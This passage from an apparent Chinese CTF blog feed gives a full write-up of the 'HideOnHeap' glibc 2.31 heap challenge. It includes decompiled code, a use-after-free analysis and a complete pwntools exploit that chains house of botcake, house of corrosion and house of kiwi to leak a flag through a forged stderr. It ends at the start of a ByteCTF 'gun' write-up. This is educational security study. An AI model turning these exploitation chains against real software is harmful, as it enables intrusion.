attack</code>攻击之后<code>_IO_list_all</code>指向的是一个堆块的头部，所以有0x10字节不可控，因此不在该堆块直接伪造用于攻击的<code>IO_FILE</code>，而是伪造成另一个<code>IO_FILE</code>,并使其<code>_chain</code>字段指向用于攻击的<code>IO_FILE</code>，此外<code>mode</code>字段为<code>0xffffffff</code>,其余字段不考虑。</li></ul><h3 id="Reference-3"><a href="#Reference-3" class="headerlink" title="Reference"></a>Reference</h3><ul><li><a href="https://www.cnblogs.com/LynneHuan/p/15890280.html#fshuimaster">https://www.cnblogs.com/LynneHuan/p/15890280.html#fshuimaster</a></li></ul><h2 id="HideOnHeap"><a href="#HideOnHeap" class="headerlink" title="HideOnHeap"></a>HideOnHeap</h2><h3 id="基本信息-4"><a href="#基本信息-4" class="headerlink" title="基本信息"></a>基本信息</h3><ul><li><p>libc版本：<code>2.31-0ubuntu9.2</code></p></li><li><p>file HideOnHeap</p></li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">HideOnHeap</span>: ELF <span class="hljs-number">64</span>-bit LSB shared object, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter /home/sh0ve1/glibc-<span class="hljs-literal">all</span>-in-one/libs/<span class="hljs-number">2</span>.<span class="hljs-number">31</span>-<span class="hljs-number">0</span>ubuntu9.<span class="hljs-number">2</span>_amd64/ld-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so, for GNU/Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>, BuildID[sha1]=<span class="hljs-number">6</span>f18ca73f584b1eadf5290c63100c61b3918cc7f, stripped<br></code></pre></td></tr></table></figure><ul><li>保护机制:保护全开</li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Arch:</span>     amd64<span class="hljs-number">-64</span>-little<br><span class="hljs-symbol">RELRO:</span>    Full RELRO<br><span class="hljs-symbol">Stack:</span>    Canary found<br><span class="hljs-symbol">NX:</span>       NX enabled<br><span class="hljs-symbol">PIE:</span>      PIE enabled<br></code></pre></td></tr></table></figure><h3 id="程序分析-4"><a href="#程序分析-4" class="headerlink" title="程序分析"></a>程序分析</h3><p>程序在一开始申请了一个堆块，并将flag读取到该堆块中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">startup</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// ebp</span><br>  <span class="hljs-type">char</span> *flag_addr; <span class="hljs-comment">// rax</span><br><br>  <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">setbuf</span>(stderr, <span class="hljs-number">0LL</span>);<br>  fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag&quot;</span>, <span class="hljs-number">0</span>);<br>  flag_addr = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>uLL);<br>  <span class="hljs-built_in">read</span>(fd, flag_addr + <span class="hljs-number">0x60</span>, <span class="hljs-number">0x30</span>uLL);<br>  <span class="hljs-built_in">close</span>(fd);<br>  <span class="hljs-built_in">alarm</span>(<span class="hljs-number">0x3C</span>u);<br>  ......<br>&#125;<br></code></pre></td></tr></table></figure><p>该程序存在堆块的申请、释放和编辑功能</p><p>根据Size数组是否为0来分配堆块下标，最多可以有32个，可申请的size足够大。申请成功之后，将堆块指针和size存放到对应下标的heap_array和Size数组中</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 v0; <span class="hljs-comment">// rax</span><br>  __int64 idx; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// er12</span><br>  <span class="hljs-type">void</span> *addr; <span class="hljs-comment">// rax</span><br><br>  v0 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    idx = (<span class="hljs-type">int</span>)v0;                              <span class="hljs-comment">// 根据Size是否为0分配下标</span><br>    <span class="hljs-keyword">if</span> ( !Size[v0] )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( ++v0 == <span class="hljs-number">32</span> )                           <span class="hljs-comment">// 最多32个</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;FULL\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;Size:&quot;</span>);<br>  size = <span class="hljs-built_in">get_LInt</span>();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(size - <span class="hljs-number">1</span>) &gt; <span class="hljs-number">0x14FE</span> )   <br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;INVALID SIZE\n&quot;</span>);<br>  addr = <span class="hljs-built_in">malloc</span>(size);<br>  <span class="hljs-keyword">if</span> ( !addr )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;INVALID POINT\n&quot;</span>);<br>  Size[idx] = size;<br>  heap_array[idx] = addr;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;DONE\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>根据下标确定堆块，检查了堆块指针是否非空和size是否大于0，若通过就可以编辑堆块。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">edit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> idx; <span class="hljs-comment">// eax</span><br>  __int64 idx_0; <span class="hljs-comment">// rbx</span><br><br>  <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;Index:&quot;</span>);<br>  idx = <span class="hljs-built_in">get_LInt</span>();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)idx &gt; <span class="hljs-number">31</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;INVALID INDEX\n&quot;</span>);<br>  idx_0 = idx;<br>  <span class="hljs-keyword">if</span> ( !*((_QWORD *)&amp;heap_array + idx) || !Size[idx] )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;INVALID INDEX\n&quot;</span>);<br>  <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;Content:&quot;</span>);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, *((<span class="hljs-type">void</span> **)&amp;heap_array + idx_0), Size[idx_0]);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;DONE\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>根据下标确定堆块，只检查了堆块指针是否非空没有检查size是否大于0，并且释放堆块后只是将size置为0，所以存在UAF漏洞，但是由于编辑功能检查了size，所以释放后无法编辑。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">delete</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx; <span class="hljs-comment">// eax</span><br>  __int64 idx_0; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">void</span> *addr; <span class="hljs-comment">// rdi</span><br><br>  <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;Index:&quot;</span>);<br>  idx = <span class="hljs-built_in">get_LInt</span>();<br>  <span class="hljs-keyword">if</span> ( idx &gt; <span class="hljs-number">0x1F</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;INVALID INDEX\n&quot;</span>);<br>  idx_0 = (<span class="hljs-type">int</span>)idx;<br>  addr = (<span class="hljs-type">void</span> *)heap_array[idx];<br>  <span class="hljs-keyword">if</span> ( !addr )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;INVALID INDEX\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(addr);                                   <span class="hljs-comment">// UAF | double free</span><br>  Size[idx_0] = <span class="hljs-number">0</span>;                              <span class="hljs-comment">// free之后无法edit</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">mywrite</span>(<span class="hljs-string">&quot;DONE\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="利用思路-4"><a href="#利用思路-4" class="headerlink" title="利用思路"></a>利用思路</h3><p>首先，我们的目标使泄露堆块中的flag，即堆块内容。</p><p>由于程序只是使用了read和write进行输入输出,没有IO函数，所以不能通过stdout泄露数据。并且程序没有打印堆块数据的功能，所以无法泄露libc基址和堆块地址。</p><p>利用 <code>__malloc_assert</code> 中的 <code>__fxprintf</code> ，这个函数是一个 IO 函数，并且进入内部发现在第一个参数传参为 NULL 时，会变化成 stderr，所以可以想到利用 伪造 stderr 结构来泄露堆块上的数据。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>__malloc_assert (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *assertion, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> line,<br> <span class="hljs-type">const</span> <span class="hljs-type">char</span> *function)<br>&#123;<br>  (<span class="hljs-type">void</span>) __fxprintf (<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,<br>     __progname, __progname[<span class="hljs-number">0</span>] ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>     file, line,<br>     function ? function : <span class="hljs-string">&quot;&quot;</span>, function ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>     assertion);<br>  <span class="hljs-built_in">fflush</span> (stderr);<br>  <span class="hljs-built_in">abort</span> ();<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>因此，需要修改stderr的 <code>_flags</code> 和 <code>_IO_write_base</code> 。其中 <code>_IO_write_base</code> 必须是flag所在堆块地址的附近。所以我们现在需要劫持stderr，修改其中的 <code>_IO_write_base</code> 为堆块地址</p><p>由于程序只存在UAF漏洞，所以利用<code>house of botcake</code>构造 <code>chunk overlapping</code> (同一区域同时存在unsortedbin和tcache中)，此处需要注意在申请unsortedbin时要让tcache中的堆块的fd等于<code>main_arena+offset</code>，然后再修改后2字节，使tcache中的堆块指向stderr（1&#x2F;16几率）。再申请两次即可获取其控制权。</p><p>由于不知道堆块地址，所以我们需要一种攻击方式来写<code> _IO_write_base</code> 为堆块地址，例如largebin attack，但是由于释放后的堆块无法编辑，所以利用 <code>house of corrision</code> 攻击实现目标。采用上述相同的方式可以控制 <code>global_max_fast</code>（1&#x2F;16几率）,然后根据<code>_IO_write_base</code>与<code>main_arena.fastbinY</code>的偏移计算出需要申请的堆块大小。申请之后再修改<code>global_max_fast</code>为一个大数，释放后再修改为0x80。</p><p>此时再修改stderr的<code>_flags</code>,并将<code>_IO_write_base</code>的最后2字节修改为适当字节，使能够输出flag。</p><p>一切就绪，现在就需要报错触发执行<code>__malloc_assert</code>即可。这里采用<code>house of Wiki</code>中的方式：修改<code>top chunk</code>的大小为一个小值，然后申请一个大于它的堆块即可。</p><blockquote><p>其实不用house of botcake也可以控制tcache中的堆块，只需要释放之后，用另一个下标申请刚释放的堆块。然后利用UAF漏洞再次释放原下标即可用另一个下标修改tcache中的堆块。但是由于不知道libc地址所以这里只能使用house of botcake</p></blockquote><h3 id="Exp-4"><a href="#Exp-4" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">@文件        :exp.py</span><br><span class="hljs-string">@说明        :house of botcake + house of corrision + house of Wiki + house of </span><br><span class="hljs-string">@时间        :2022/02/12 10:15:39</span><br><span class="hljs-string">@作者        :sh0ve1</span><br><span class="hljs-string">@防护</span><br><span class="hljs-string">    Arch:     amd64-64-little</span><br><span class="hljs-string">    RELRO:    Full RELRO</span><br><span class="hljs-string">    Stack:    Canary found</span><br><span class="hljs-string">    NX:       NX enabled</span><br><span class="hljs-string">    PIE:      PIE enabled</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> pwn import *<br>import pwnlib<br><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>REMOTE = 0<br><span class="hljs-keyword">if</span> REMOTE:<br>    p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,29972)<br>    libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./HideOnHeap&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&#x27;/home/sh0ve1/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./HideOnHeap&#x27;</span>)<br><br>def <span class="hljs-built_in">add</span>(size):<br>    p.sendlineafter(<span class="hljs-string">&quot;Choice:&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;Size:&quot;</span>,str(size))<br><br>def <span class="hljs-built_in">edit</span>(idx,cnt):<br>    p.sendlineafter(<span class="hljs-string">&quot;Choice:&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;Index:&quot;</span>,str(idx))<br>    p.sendafter(<span class="hljs-string">&quot;Content:&quot;</span>,cnt)<br><br>def delete(idx):<br>    p.sendlineafter(<span class="hljs-string">&quot;Choice:&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;Index:&quot;</span>,str(idx))<br><br>success(<span class="hljs-string">&quot;House of Botcake...&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(9):<br>    <span class="hljs-built_in">add</span>(0x100)<br><br><span class="hljs-built_in">add</span>(0x10) #9 gap<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(7):<br>    delete(i) #0~6<br><br>delete(8)<br>delete(7)<br><span class="hljs-built_in">add</span>(0x100) # 0<br>delete(8)<br><br><span class="hljs-built_in">add</span>(0x80) #1<br><span class="hljs-built_in">add</span>(0x70) #2<br><span class="hljs-built_in">add</span>(0x80) #3 overlapping fd被修改<br><span class="hljs-built_in">add</span>(0x70) #4<br><span class="hljs-built_in">edit</span>(3,b<span class="hljs-string">&#x27;\x80\x4b&#x27;</span>) #   修改前2字节，碰撞到global_max_fast<br><br><span class="hljs-built_in">add</span>(0x100) #5 3<br><span class="hljs-built_in">add</span>(0x100) #6 global_max_fast<br><br><br>delete(9)<br><span class="hljs-comment"># gdb.attach(p)</span><br>success(<span class="hljs-string">&quot;House of Botcake...&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(9):<br>    <span class="hljs-built_in">add</span>(0x110) #7~15<br><br><span class="hljs-built_in">add</span>(0x20) #16 gap<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(7):<br>    delete(i+7) #7~13<br><br>delete(14)<br>delete(15)<br><span class="hljs-built_in">add</span>(0x110) #7<br>delete(15)<br><br><span class="hljs-built_in">add</span>(0xa0) #8<br><span class="hljs-built_in">add</span>(0x60) #9<br><span class="hljs-built_in">add</span>(0xa0) #10 overlapping<br><span class="hljs-built_in">add</span>(0x60) #11<br><br><span class="hljs-built_in">edit</span>(10,b<span class="hljs-string">&#x27;\xc0\x25) # 修改前2字节，碰撞到stderr 0x7ffff7fc25c0</span><br><span class="hljs-string">add(0x110) #12</span><br><span class="hljs-string">add(0x110) #13 stderr</span><br><span class="hljs-string"></span><br><span class="hljs-string">success(&quot;House of Corrosion...&quot;)</span><br><span class="hljs-string">add(0x14b0) #14</span><br><span class="hljs-string">edit(6,p32(0x66666666)) # 修改global_max_fast 必须要在申请大chunk之后再修改global_max_fast</span><br><span class="hljs-string">delete(14)</span><br><span class="hljs-string">edit(13,p64(0xfbad1800)+p64(0)*3+b&#x27;</span>\x90\xb2<span class="hljs-string">&#x27;) # 修改stderr</span><br><span class="hljs-string"></span><br><span class="hljs-string">edit(6,p32(0x80)) # 修改global_max_fast</span><br><span class="hljs-string"></span><br><span class="hljs-string">success(&quot;House of Kiwi...&quot;)</span><br><span class="hljs-string">add(0x420) #14</span><br><span class="hljs-string">delete(14)</span><br><span class="hljs-string">delete(0)</span><br><span class="hljs-string">delete(1)</span><br><span class="hljs-string">add(0x420) #0</span><br><span class="hljs-string">delete(14)</span><br><span class="hljs-string">add(0x410) #1</span><br><span class="hljs-string">edit(0,b&#x27;</span>\x00<span class="hljs-string">&#x27;*0x410+p64(0) + p64(0x231)) # 修改top chunk</span><br><span class="hljs-string">delete(1) </span><br><span class="hljs-string"></span><br><span class="hljs-string">add(0x700) # 触发house of wiki __malloc_assert </span><br><span class="hljs-string"></span><br><span class="hljs-string">data = p.recvuntil(b&#x27;</span>&#125;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">p.recv()</span><br><span class="hljs-string">i = data.find(b&quot;flag&quot;)</span><br><span class="hljs-string"># j = data.find(b&quot;&#125;&quot;) + 1</span><br><span class="hljs-string">success(str(data[i:]))</span><br><span class="hljs-string"></span><br><span class="hljs-string"># gdb.attach(p)</span><br><span class="hljs-string">p.interactive()</span><br><span class="hljs-string">p.close()</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h3 id="Summary-4"><a href="#Summary-4" class="headerlink" title="Summary"></a>Summary</h3><ul><li>house of botcake可以在不知道libc基址的情况下使tcache指向libc（1&#x2F;16几率）</li><li>read和write是系统调用，不是IO函数，是不使用缓冲区的。它直接将内容写入到对应的文件中（或直接从对应的文件中读取），因为write，read函数是直接使用文件描述符的，并不使用FILE结构。</li></ul><h3 id="Reference-4"><a href="#Reference-4" class="headerlink" title="Reference"></a>Reference</h3><ul><li><a href="https://www.cnblogs.com/winmt/articles/15887841.html">https://www.cnblogs.com/winmt/articles/15887841.html</a></li><li><a href="https://www.cnblogs.com/LynneHuan/p/15890280.html#hideonheap">https://www.cnblogs.com/LynneHuan/p/15890280.html#hideonheap</a></li><li><a href="http://blog.wjhwjhn.com/archives/783/">http://blog.wjhwjhn.com/archives/783/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2020ByteCTF-gun</title>
    <link href="/2021/12/31/2020ByteCTF-gun/"/>
    <url>/2021/12/31/2020ByteCTF-gun/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2020年ByteCTF的一道堆题，主要考察libc-2.31.so中的堆利用</p><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><ul><li>使用的是<code>libc-2.31.so</code></li><li>secomp-tools dump .&#x2F;gun ：只能通过ORW获取flag</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0000</span>: <span class="hljs-number">0</span>x20 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x00000004  A = arch<br><span class="hljs-attribute">0001</span>: <span class="hljs-number">0</span>x15 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x09 <span class="hljs-number">0</span>xc000003e  if (A != ARCH_X86_64) goto <span class="hljs-number">0011</span><br><span class="hljs-attribute">0002</span>: <span class="hljs-number">0</span>x20 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x00000000  A = sys_number<br><span class="hljs-attribute">0003</span>: <span class="hljs-number">0</span>x35 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x01 <span class="hljs-number">0</span>x40000000  if (A &lt; <span class="hljs-number">0</span>x40000000) goto <span class="hljs-number">0005</span><br><span class="hljs-attribute">0004</span>: <span class="hljs-number">0</span>x15 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x06 <span class="hljs-number">0</span>xffffffff  if (A != <span class="hljs-number">0</span>xffffffff) goto <span class="hljs-number">0011</span><br><span class="hljs-attribute">0005</span>: <span class="hljs-number">0</span>x15 <span class="hljs-number">0</span>x04 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x00000000  if (A == read) goto <span class="hljs-number">0010</span><br><span class="hljs-attribute">0006</span>: <span class="hljs-number">0</span>x15 <span class="hljs-number">0</span>x03 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x00000001  if (A == write) goto <span class="hljs-number">0010</span><br><span class="hljs-attribute">0007</span>: <span class="hljs-number">0</span>x15 <span class="hljs-number">0</span>x02 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x00000002  if (A == open) goto <span class="hljs-number">0010</span><br><span class="hljs-attribute">0008</span>: <span class="hljs-number">0</span>x15 <span class="hljs-number">0</span>x01 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x0000003c  if (A == exit) goto <span class="hljs-number">0010</span><br><span class="hljs-attribute">0009</span>: <span class="hljs-number">0</span>x15 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x01 <span class="hljs-number">0</span>x00000101  if (A != openat) goto <span class="hljs-number">0011</span><br><span class="hljs-attribute">0010</span>: <span class="hljs-number">0</span>x06 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x7fff0000  return <span class="hljs-literal">ALLOW</span><br><span class="hljs-attribute">0011</span>: <span class="hljs-number">0</span>x06 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x00000000  return KILL<br></code></pre></td></tr></table></figure><ul><li>checksec gun ：保护全开</li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Arch:</span>     amd64<span class="hljs-number">-64</span>-little<br><span class="hljs-symbol">RELRO:</span>    Full RELRO<br><span class="hljs-symbol">Stack:</span>    Canary found<br><span class="hljs-symbol">NX:</span>       NX enabled<br><span class="hljs-symbol">PIE:</span>      PIE enabled<br></code></pre></td></tr></table></figure><h2 id="程序分析"><a href="#程序分析" class="headerlink" 